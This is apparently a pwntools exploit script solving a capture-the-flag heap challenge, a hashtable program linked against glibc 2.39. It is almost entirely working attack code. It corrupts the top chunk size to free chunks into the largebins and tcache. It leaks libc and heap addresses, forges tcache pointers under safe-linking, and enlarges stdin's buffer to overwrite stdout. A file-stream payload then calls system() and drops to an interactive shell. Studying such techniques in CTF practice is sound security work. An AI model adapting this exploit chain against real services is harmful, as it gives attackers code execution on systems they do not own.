from pwn import * 

elf = context.binary = ELF('./chall_patched') # patched to use the libc
libc = ELF('./libc.so.6') # unstripped Ubuntu GLIBC 2.39

if args.REMOTE:
    io = remote('localhost', 1337)
else:
    io = gdb.debug(elf.path)

NUM_HASHTABLES = 20
next_hashtable_idx = 0

def new_hashtable(size: int):
    global next_hashtable_idx
    idx = next_hashtable_idx
    assert 0 <= idx < NUM_HASHTABLES
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.sendlineafter(b'Size: ', str(size).encode())
    next_hashtable_idx += 1
    # if next_hashtable_idx == NUM_HASHTABLES:
    #     next_hashtable_idx = 0
    return idx

def set_keyval(idx: int, key: int, val: bytes):
    assert 0 <= idx < NUM_HASHTABLES
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.sendlineafter(b'Key: ', str(key).encode())
    io.sendafter(b'Value: ', val)

def get_keyval(idx: int, key: int) -> bytes:
    assert 0 <= idx < NUM_HASHTABLES
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.sendlineafter(b'Key: ', str(key).encode())
    io.recvuntil(b'Value: ')
    result = io.recvuntil(b'> ', drop=True)
    io.sendline(b'6 ') # invalid option
    return result

# deobfucation for pointer encryption if ptr and pos are in the same page
def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def ob_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

def deob_ptr(pos, val):
    return ob_ptr(pos, val)

# generates the payload for stdout FSOP
def brother_may_I_have_some_oats(fp_addr):
    fp = FileStructure(null=fp_addr+0x68)
    fp.flags = 0x687320
    fp._IO_read_ptr = 0x0
    fp._IO_write_base = 0x0
    fp._IO_write_ptr = 0x1
    fp._wide_data = fp_addr-0x10
    payload = bytes(fp)
    payload = payload[:0xc8] + p64(libc.sym['system']) + p64(fp_addr + 0x60)
    payload += p64(libc.sym['_IO_wfile_jumps'])
    return payload


size = 0xd00
write_payload = p64(size + 0x21)

t4 = new_hashtable(2) # 0x20
set_keyval(t4, 0x43, b'C'*8)
set_keyval(t4, 0x44, b'D'*8)

t1 = new_hashtable(3) # 0x30
set_keyval(t1, 1, b'A' * 0x8)
set_keyval(t1, 2, b'B' * 0x8)
set_keyval(t1, 3, b'C' * 0x8)
set_keyval(t1, 0, write_payload) # overwrite size of topchuck

# allocate two big chunks to bring freed chunk to largebins
t2 = new_hashtable(0x154) # 0x1000 force top chunk to be freed to unsorted bin
t3 = new_hashtable(0x154) # 0x1000 put the freed top chunk into largebins

set_keyval(t1, 0, p32(0xd01) + b'AAAA') # fill null bytes so that the printf in get val will reach the LSB of the libc address in fwd ptr
lower_libc_leak = u64(get_keyval(t4, 0xd01).ljust(8, b'\x00')) >> 32
set_keyval(t1, 0, p64(0xd01)) # undo the write
higher_libc_leak = u64(get_keyval(t1, lower_libc_leak).ljust(8, b'\0')) # get the higher libc address from the fwd ptr
libc_leak = (higher_libc_leak << 32) | lower_libc_leak
libc.address = libc_leak - 0x204120
log.info(f'libc base: {hex(libc.address)}')

heap_leak = u64(get_keyval(t1, higher_libc_leak).ljust(8, b'\0')) # get the heap address from the fd nextsize
heap_base = heap_leak - 0x2e0
log.info(f'heap base: {hex(heap_base)}')

t1 = new_hashtable(0x114) # reclaim largebin

t1 = new_hashtable(0x148)
t1 = new_hashtable(2) # 0x20
set_keyval(t1, 0x43, b'C'*8)
set_keyval(t1, 0x44, b'D'*8)
t2 = new_hashtable(3) # 0x30
set_keyval(t2, 1, b'A' * 0x8)
set_keyval(t2, 2, b'B' * 0x8)
set_keyval(t2, 3, b'C' * 0x8)

size = 0x20
write_payload = p64(size + 0x21)
# overwrite size of topchunk
set_keyval(t2, 0, write_payload) # tcache[0x20]

t1 = new_hashtable(0x154) # 0x1000 free top chunk into tcache

# do similar thing again
t1 = new_hashtable(0x146)
t1 = new_hashtable(4) # 0x40
set_keyval(t1, 0x44, b'D'*8)
set_keyval(t1, 0x45, b'E'*8)
set_keyval(t1, 0x46, b'F'*8)
set_keyval(t1, 0x47, b'G'*8)
t2 = new_hashtable(3) # 0x30
set_keyval(t2, 1, b'A' * 0x8)
set_keyval(t2, 2, b'B' * 0x8)
set_keyval(t2, 3, b'C' * 0x8)

size = 0x20
write_payload = p64(size + 0x21)
# overwrite size of topchunk
set_keyval(t2, 0, write_payload) # tcache[0x20]

t3 = new_hashtable(0x154) # 0x1000 free top chunk into tcache

# setup so we know the key to corrupt tcache
set_keyval(t2, 0, p32(0x21) + b'ntr\0') # key is 0x72746e

pos = heap_base + 0x44fd0
ptr = libc.sym['_IO_2_1_stdin_'] + 0x30
set_keyval(t1, 0x72746e, p64(ob_ptr(pos, ptr)))

t4 = new_hashtable(2) # 0x20
t7 = new_hashtable(2) # 0x20

key = ptr >> 32
# partially overwrite _IO_buf_end so that the buffer is much larger
set_keyval(t7, key, b'\xff\xff\xff')

# stdin should now be buffered starting from _shortbuf of stdin to over the entire stdout
# we can now send the paylod to overwrite stdin partially, overwrite everything in between stdin and stdout, and overwriting stdout such that it gives us shell

stdin_lock = libc.sym['_IO_stdfile_0_lock']
stdin_wide_data = libc.sym['_IO_wide_data_0']
mode = 0xffffffff # 32-bit integer

stdin_payload = b''
stdin_payload += b'6AAAA' # _shortbuf
stdin_payload += p64(stdin_lock) # _lock
stdin_payload += p64(0xffffffffffffffff) # _offset
stdin_payload += p64(0) # _codecvt
stdin_payload += p64(stdin_wide_data) # _wide_data
stdin_payload += p64(0) # _freeres_list
stdin_payload += p64(0) # _freeres_buf
stdin_payload += p64(0) # __pad5
stdin_payload += p32(mode) # _mode
stdin_payload += b'\0' * 0x14 # _unused2
stdin_payload += p64(libc.sym['_IO_file_jumps']) # vtable

stdout_payload = brother_may_I_have_some_oats(libc.sym['_IO_2_1_stdout_'])

in_between = flat({
    #      -> 0x7efc1646c025 488b4368                <__vfscanf_internal+0x805>   mov    rax, QWORD PTR [rbx + 0x68]
    #     0x7efc1646c029 4963c8                  <__vfscanf_internal+0x809>   movsxd rcx, r8d
    #     0x7efc1646c02c 4983c601                <__vfscanf_internal+0x80c>   add    r14, 0x1
    #     0x7efc1646c030 4801c9                  <__vfscanf_internal+0x810>   add    rcx, rcx
    #     0x7efc1646c033 0fb70408                <__vfscanf_internal+0x813>   movzx  eax, WORD PTR [rax + rcx * 1]
    #     0x7efc1646c037 f6c420                  <__vfscanf_internal+0x817>   test   ah, 0x20
    # ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ memory access: $rbx+0x68 = 0x7efc16604428 ----
    #       0x7efc16604428|+0x0000|+000: 0x00007efc165b28c0 <_nl_C_LC_CTYPE_class+0x100>  ->  0x0002000200020002
    #       0x7efc16604430|+0x0008|+001: 0x00007efc165b19c0 <_nl_C_LC_CTYPE_tolower+0x200>  ->  0x0000000100000000
    #       0x7efc16604438|+0x0010|+002: 0x00007efc165b1fc0 <_nl_C_LC_CTYPE_toupper+0x200>  ->  0x0000000100000000
    #       0x7efc16604440|+0x0018|+003: 0x00007efc165cca38 <_nl_C_name>  ->  0x5a5400544d470043

    0xa68: libc.address + 0x1b28c0,
}, length=0xc00)

io.send(stdin_payload + in_between + stdout_payload)

io.interactive()
